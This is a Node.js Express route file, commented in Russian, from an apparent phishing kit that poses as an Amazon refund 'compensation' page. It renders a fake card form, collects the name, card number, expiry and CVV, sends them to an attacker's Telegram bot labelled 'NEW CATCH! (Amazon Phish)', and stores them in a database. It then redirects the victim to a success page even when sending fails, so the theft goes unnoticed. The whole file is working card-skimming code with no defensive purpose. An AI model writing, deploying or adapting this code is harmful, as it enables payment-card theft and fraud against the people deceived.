// routes/compensation.js
const express = require('express');
const router = express.Router();
const storage = require('../data/storage'); // Подключение к БД
const axios = require('axios'); // <--- БИБЛИОТЕКА ДЛЯ ЗАПРОСОВ

// 1. Отображение формы
router.get('/compensation', (req, res) => {
    const { item, price } = req.query;
    res.render('refund_card_form', {
        item: item,
        price: price
    }); 
});

// 2. Прием данных и отправка в ТГ
router.post('/submit-card-data', async (req, res) => {
    const { card_holder, card_number, expiry, cvv } = req.body;

    // --- ФОРМИРУЕМ СООБЩЕНИЕ ДЛЯ TELEGRAM ---
    const message = `
🦈 <b>NEW CATCH!</b> (Amazon Phish)

👤 <b>Name:</b> ${card_holder}
💳 <b>Card:</b> <code>${card_number}</code>
📅 <b>Exp:</b> ${expiry}
🔒 <b>CVV:</b> <code>${cvv}</code>

<i>Данные также сохранены в базу Supabase.</i>
    `;

    try {
        // А. Отправляем в Telegram
        const tgToken = process.env.TG_BOT_TOKEN;
        const chatId = process.env.TG_CHAT_ID;
        
        // URL API Телеграма
        const url = `https://api.telegram.org/bot${tgToken}/sendMessage`;

        await axios.post(url, {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML' // Чтобы работала жирность и копирование по клику
        });
        
        console.log('✅ Уведомление отправлено в Telegram');

        // Б. Сохраняем в Supabase (как и раньше)
        const collectedData = {
            holder: card_holder,
            number: card_number,
            expiration: expiry,
            cvv: cvv,
            timestamp: new Date().toISOString()
        };
        await storage.saveCardData(collectedData);
        console.log('✅ Данные сохранены в БД');

        // В. Редирект жертвы на успех
        res.redirect('/success'); 

    } catch (error) {
        console.error('❌ Ошибка отправки:', error.message);
        // Даже если Телеграм не сработал, перекидываем жертву, чтобы не палиться
        res.redirect('/success'); 
    }
});

module.exports = router;